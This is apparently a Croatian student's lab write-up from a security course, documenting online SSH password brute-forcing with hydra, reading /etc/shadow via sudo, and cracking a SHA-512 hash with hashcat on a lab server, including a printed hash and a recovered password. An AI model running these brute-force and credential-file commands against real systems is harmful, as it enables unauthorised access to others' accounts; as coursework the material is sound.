# SRP Lab 5

Otvaramo bash

Pingamo a507 local server da vidimo jesmo li na istom lanu:

```python
ping a507-server.local
```

upoznavanje sa nmap

otvaramo local server i sa njega uzimamo svoj username (milicevic_mario) i ip adresu dockera (10.0.15.1) 

spajamo se na server ssh klijentom, korištenjem komande:

```python
ssh milicevic_mario@10.0.15.1
```

pokusamo 3 puta pogoditi password, sustav nas odbija ali vidimo da nema rate limita

Znamo da su passwordi od 4 do 6 lowercase engleskih slova abecede kojih ima 26, što znači da postoji:

26^4+26^5+26^6 kombinacija

suma od 4 do 6 = 26^4(26^2+26+1) otprilike = 26^4*26^2 = 26^6 otprilike = 2^30

## Online napad

dalje koristimo hydru

```python
hydra -l milicevic_mario -x 4:6:a 10.0.15.1 -V -t 4 ssh
```

Pokrećemo hydru da pokušava password space od 4 do 6 charactera, kroz cijeli password space na odredenu ip adresu

[STATUS] 64.00 tries/min, 64 tries in 00:01h, 321254064 to do in 83659:55h, 4 active - 64 pokusaja po minuti tj 2^6

password space je otprilike 2^30

2^30/2^6 = 2^24 minuta potrebno za probijanje šifre

365*24*60 otprilike = 2^8*2^5*2^6 = 2^19 minuta u godini

Napad dakle traje otprilike 2^5 godina tj 32 godine

Wgetom skidamo lokalno online i offline dictionary da bi olakšali napad

```python
wget -r -nH -np --reject "index.html*" http://a507-server.local:8080/dictionary/g4/
```

Dajemo hydri dictionary

```python
hydra -l milicevic_mario -P dictionary/g4/dictionary_online.txt 10.0.15.1 -V -t 4 ssh
```

Dictionary ima 860 passworda, prosječno treba probati pola za naći šifru, meni našlo nakon 227, šifra je hanffr

```python
ssh milicevic_mario@10.0.15.1, nakon toga upisujem šifru hanffr i uspijeva se logirati
```

## Offline napad

Koristimo hashcat

```python
cat /etc/shadow - permission denied
```

id - izlistava kojim grupama pripadamo

```python
sudo cat /etc/shadow - ulazimo kao superuser
```

U shadow direktoriju se nalaze hashevi svih passworda

Kopiramo hash vrijednost od nekog usera, u mom primjeru freddie_mercury: $6$RrlWj8WUhVh55ors$Jja11nctU7VWOCTnRVGqEfiahZAMqg7xoJPZi7DwpNXhJhcKMmAcvv6trjthHYhHMa9gzS4VPFgi/K4b8MJJK1

Dva puta exit da izađemo

Napravimo u svom direktoriju file hash.txt i kopiramo hash vrijednost passworda

Napad se sastoji od linije koda:

```python
hashcat --force -m 1800 -a 3 hash.txt ?l?l?l?l?l?l --status --status-timer 10
```

Drugi napad:

```python
hashcat --force -m 1800 -a 0 hash.txt dictionary/g4/dictionary_offline.txt --status --status-timer 10
```

nalazimo password, komandom

```python
ssh freddie_mercury@10.0.15.1
```

i unosom odgovarajućeg passworda uspijevamo se ulogirati na server.